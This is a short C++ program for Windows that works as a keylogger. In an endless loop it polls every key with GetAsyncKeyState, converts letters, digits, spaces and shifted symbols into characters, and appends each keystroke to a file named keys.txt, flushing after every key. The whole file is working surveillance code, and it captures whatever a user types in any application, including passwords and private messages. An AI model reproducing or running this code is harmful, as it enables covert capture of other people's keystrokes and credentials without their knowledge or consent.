#include <windows.h>
#include <fstream>
#include <iostream>
#include <unordered_map>

int main() {
	//open the output file
	std::ofstream file("keys.txt", std::ios_base::app);
	if (!file.is_open()) {
		std::cerr << "Error: Unable to open output file.\n";
		return 1;
	}

	//Maop of ASCII values to their corresponding shifted character
	std::unordered_map<int, char> shiftedKeys = {
		{48, ')'}, {49,'!'}, {50,'@'}, {51,'#'}, {52,'$'}, {53,'%'}, {54,'^'}, {55,'&'}, {56,'*'}, {57,'('}, {187,'+'}, {189,'_'},
		{219,'{'}, {221,'}'}, {220,'|'}, {186,':'}, {222,'\"'}, {188,'<'}, {190,'>'}, {191,'?'}
	};

		while (true) {
			//reduce CPU usage
			Sleep(10);

			for (int i = 8; i <= 255; i++) {
				if (GetAsyncKeyState(i) == -32767) {
					if ((i >= 65 && i <= 90) || (i >= 48 && i <= 57) || i == 32) {
						bool isShiftPressed = ((GetKeyState(VK_SHIFT) & 0x8000) != 0);
						if ((i >= 65 && i <= 90) && !isShiftPressed) {
							file << static_cast<char>(i + 32);
						}
						else if ((i >= 65 && i <= 90) && isShiftPressed) {
							file << static_cast<char>(i);
						}
						else if (!isShiftPressed) {
							file << static_cast<char>(i);
						}
						else if (isShiftPressed && shiftedKeys.count(i) > 0) {
							file << shiftedKeys[i];
						}

						//write character immediatly
						file.flush();
					}
				}
			}
		}
		file.close();
		return 0;
}